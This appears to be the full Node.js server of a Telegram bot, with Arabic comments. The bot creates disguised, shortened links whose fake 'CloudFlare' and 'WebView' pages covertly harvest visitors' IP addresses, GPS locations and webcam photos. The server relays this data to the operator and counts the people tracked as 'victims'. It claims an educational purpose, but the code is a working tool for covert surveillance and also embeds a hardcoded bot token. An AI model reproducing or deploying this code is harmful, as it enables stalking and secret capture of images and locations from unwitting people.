const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb', parameterLimit: 1000000 }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// ================== الإعدادات الثابتة ==================
const token = '8619883948:AAHLY15CrJIhe545S8CAI7gvIW3KLxbP3n0';          // ضع توكن البوت هنا
const hostURL = 'https://yourdomain.com'; // ضع رابط الخادم هنا (مثال: https://your-app.onrender.com)
const use1pt = true;                    // تعطيل تقصير الروابط لتجنب المشاكل

// ================== إنشاء البوت مع Webhook ==================
const bot = new TelegramBot(token);
const webhookPath = '/webhook';

bot.setWebHook(`${hostURL}${webhookPath}`).then(() => {
    console.log(`✅ Webhook set to ${hostURL}${webhookPath}`);
}).catch(err => {
    console.error("❌ Failed to set webhook:", err);
});

app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ================== تخزين الجلسات ==================
const userSessions = {};

// ================== المسارات الخاصة بالصفحات ==================
app.get("/w/:path/:uri", (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    let d = new Date().toJSON().slice(0,19).replace('T',':');
    let photoCount = userSessions[parseInt(req.params.path,36)]?.photoCount || 4;
    res.render("webview", {
        ip: ip.split(',')[0],
        time: d,
        url: atob(req.params.uri),
        uid: req.params.path,
        a: hostURL,
        t: use1pt,
        photoCount: photoCount
    });
});

app.get("/c/:path/:uri", (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    let d = new Date().toJSON().slice(0,19).replace('T',':');
    let photoCount = userSessions[parseInt(req.params.path,36)]?.photoCount || 4;
    res.render("cloudflare", {
        ip: ip.split(',')[0],
        time: d,
        url: atob(req.params.uri),
        uid: req.params.path,
        a: hostURL,
        t: use1pt,
        photoCount: photoCount
    });
});

// ================== مسارات استقبال البيانات ==================
app.get("/", (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    res.json({ ip: ip.split(',')[0] });
});

app.post("/location", (req, res) => {
    let lat = parseFloat(decodeURIComponent(req.body.lat));
    let lon = parseFloat(decodeURIComponent(req.body.lon));
    let uid = decodeURIComponent(req.body.uid);
    let acc = decodeURIComponent(req.body.acc);
    if (!isNaN(lat) && !isNaN(lon) && uid && acc) {
        let chatId = parseInt(uid, 36);
        bot.sendLocation(chatId, lat, lon);
        bot.sendMessage(chatId, `📍 **الموقع:**\nخط العرض: ${lat}\nخط الطول: ${lon}\nالدقة: ${acc} متر`, { parse_mode: 'Markdown' });
        if (userSessions[chatId]) {
            userSessions[chatId].stats.locations = (userSessions[chatId].stats.locations || 0) + 1;
        }
        res.send("Done");
    } else {
        res.status(400).send("Invalid data");
    }
});

app.post("/", (req, res) => {
    let uid = decodeURIComponent(req.body.uid);
    let data = decodeURIComponent(req.body.data);
    if (uid && data) {
        let chatId = parseInt(uid, 36);
        bot.sendMessage(chatId, data, { parse_mode: "HTML" });
        if (userSessions[chatId]) {
            userSessions[chatId].stats.victims = (userSessions[chatId].stats.victims || 0) + 1;
            userSessions[chatId].stats.lastVictimTime = new Date().toISOString();
        }
        res.send("Done");
    } else {
        res.status(400).send("Invalid data");
    }
});

app.post("/camsnap", (req, res) => {
    let uid = decodeURIComponent(req.body.uid);
    let img = decodeURIComponent(req.body.img);
    if (uid && img) {
        let chatId = parseInt(uid, 36);
        let buffer = Buffer.from(img, 'base64');
        let info = { filename: "camsnap.png", contentType: 'image/png' };
        bot.sendPhoto(chatId, buffer, {}, info).catch(e => console.log("Error sending photo:", e));
        if (userSessions[chatId]) {
            userSessions[chatId].stats.images = (userSessions[chatId].stats.images || 0) + 1;
        }
        res.send("Done");
    } else {
        res.status(400).send("Invalid data");
    }
});

// ================== دوال مساعدة لإنشاء الروابط ==================
async function createLink(chatId, msg) {
    let encoded = [...msg].some(char => char.charCodeAt(0) > 127);
    if ((msg.toLowerCase().startsWith('http://') || msg.toLowerCase().startsWith('https://')) && !encoded) {
        let url = chatId.toString(36) + '/' + Buffer.from(msg).toString('base64');
        let cUrl = `${hostURL}/c/${url}`;
        let wUrl = `${hostURL}/w/${url}`;
        
        bot.sendChatAction(chatId, "typing");
        
        if (use1pt) {
            try {
                let x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
                let y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());
                let f = Object.values(x).join('\n');
                let g = Object.values(y).join('\n');
                bot.sendMessage(chatId, `✅ تم إنشاء الروابط بنجاح.\n\nالرابط الأصلي: ${msg}\n\n**روابطك:**\n🌐 CloudFlare: \n${f}\n\n🌐 WebView: \n${g}`, { parse_mode: 'Markdown' });
            } catch (e) {
                bot.sendMessage(chatId, `❌ فشل في تقصير الروابط، الروابط الأصلية:\n🌐 CloudFlare: ${cUrl}\n🌐 WebView: ${wUrl}`);
            }
        } else {
            bot.sendMessage(chatId, `✅ تم إنشاء الروابط بنجاح.\n\nالرابط الأصلي: ${msg}\n\n**روابطك:**\n🌐 CloudFlare: ${cUrl}\n🌐 WebView: ${wUrl}`, { parse_mode: 'Markdown' });
        }
        
        if (!userSessions[chatId]) userSessions[chatId] = { links: [], stats: { victims:0, images:0, locations:0 } };
        userSessions[chatId].links.push({ url: msg, cUrl, wUrl, createdAt: new Date() });
    } else {
        bot.sendMessage(chatId, "⚠️ الرجاء إدخال رابط صحيح يبدأ بـ http:// أو https://");
        createNew(chatId);
    }
}

function createNew(chatId) {
    bot.sendMessage(chatId, "🌐 **أدخل الرابط الذي تريد إخفاؤه (مع http/https):**", {
        reply_markup: { force_reply: true },
        parse_mode: 'Markdown'
    });
}

// ================== أوامر البوت ومعالجة الرسائل ==================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const firstName = msg.from.first_name || '';
    
    if (!userSessions[chatId]) {
        userSessions[chatId] = {
            photoCount: 4,
            links: [],
            stats: { victims: 0, images: 0, locations: 0, lastVictimTime: null }
        };
    }
    
    const welcomeMessage = `مرحباً ${firstName}،
هذا البوت يسمح لك بإنشاء روابط تتبع لجمع معلومات الزوار (لأغراض تعليمية فقط).`;
    
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "➕ إنشاء رابط جديد", callback_data: "crenew" }],
                [{ text: "📊 إحصائيات سريعة", callback_data: "stats" }],
                [{ text: "🔗 إدارة الروابط النشطة", callback_data: "manage_links" }],
                [{ text: "⚙️ الإعدادات", callback_data: "settings" }]
            ]
        }
    };
    bot.sendMessage(chatId, welcomeMessage, options);
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (msg.reply_to_message && msg.reply_to_message.text && msg.reply_to_message.text.includes("أدخل الرابط")) {
        createLink(chatId, text);
    }
    
    if (msg.reply_to_message && msg.reply_to_message.text && msg.reply_to_message.text.includes("كم صورة تريد التقاطها")) {
        let count = parseInt(text);
        if (isNaN(count) || count < 1) count = 4;
        if (userSessions[chatId]) {
            userSessions[chatId].photoCount = count;
            bot.sendMessage(chatId, `✅ تم تعيين عدد الصور إلى ${count}.`);
        }
        createNew(chatId);
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    
    bot.answerCallbackQuery(callbackQuery.id);
    
    if (data === "crenew") {
        bot.sendMessage(chatId, "كم صورة تريد التقاطها من الضحية؟ (العدد الافتراضي 4)", {
            reply_markup: { force_reply: true }
        });
    }
    else if (data === "stats") {
        const session = userSessions[chatId] || { stats: { victims:0, images:0, locations:0, lastVictimTime:null } };
        const stats = session.stats;
        const lastTime = stats.lastVictimTime ? new Date(stats.lastVictimTime).toLocaleString() : 'لم يدخل أحد بعد';
        const message = `📊 **إحصائياتك**:
- عدد الضحايا: ${stats.victims}
- عدد الصور المستلمة: ${stats.images}
- عدد المواقع المستلمة: ${stats.locations}
- آخر ضحية: ${lastTime}
- عدد الروابط المنشأة: ${session.links.length}`;
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    }
    else if (data === "manage_links") {
        const session = userSessions[chatId];
        if (!session || session.links.length === 0) {
            bot.sendMessage(chatId, "لا توجد روابط نشطة حالياً.");
            return;
        }
        let buttons = session.links.map((link, index) => ([
            { text: `${link.url.substring(0,20)}...`, callback_data: `show_${index}` }
        ]));
        buttons.push([{ text: "🔙 رجوع", callback_data: "back_main" }]);
        bot.sendMessage(chatId, "اختر رابطاً لعرض التفاصيل:", {
            reply_markup: { inline_keyboard: buttons }
        });
    }
    else if (data.startsWith('show_')) {
        let index = parseInt(data.split('_')[1]);
        let link = userSessions[chatId].links[index];
        if (!link) return;
        let details = `**الرابط الأصلي:** ${link.url}\n**CloudFlare:** ${link.cUrl}\n**WebView:** ${link.wUrl}\n**تاريخ الإنشاء:** ${new Date(link.createdAt).toLocaleString()}`;
        let buttons = [
            [{ text: "❌ إلغاء الرابط", callback_data: `delete_${index}` }],
            [{ text: "🔙 رجوع", callback_data: "manage_links" }]
        ];
        bot.sendMessage(chatId, details, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }
    else if (data.startsWith('delete_')) {
        let index = parseInt(data.split('_')[1]);
        if (userSessions[chatId] && userSessions[chatId].links[index]) {
            userSessions[chatId].links.splice(index, 1);
            bot.sendMessage(chatId, "✅ تم إلغاء الرابط.");
        }
        bot.emit('callback_query', { ...callbackQuery, data: 'manage_links' });
    }
    else if (data === "settings") {
        let current = userSessions[chatId]?.photoCount || 4;
        let buttons = [
            [{ text: "🔢 تغيير عدد الصور", callback_data: "change_photocount" }],
            [{ text: "🔙 رجوع", callback_data: "back_main" }]
        ];
        bot.sendMessage(chatId, `⚙️ **الإعدادات**\nعدد الصور الحالي: ${current}`, {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        });
    }
    else if (data === "change_photocount") {
        bot.sendMessage(chatId, "أدخل العدد الجديد للصور (رقم صحيح):", {
            reply_markup: { force_reply: true }
        });
    }
    else if (data === "back_main") {
        bot.emit('text', { ...msg, text: '/start' });
    }
});

// ================== تشغيل الخادم ==================
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT} with webhook`);
});
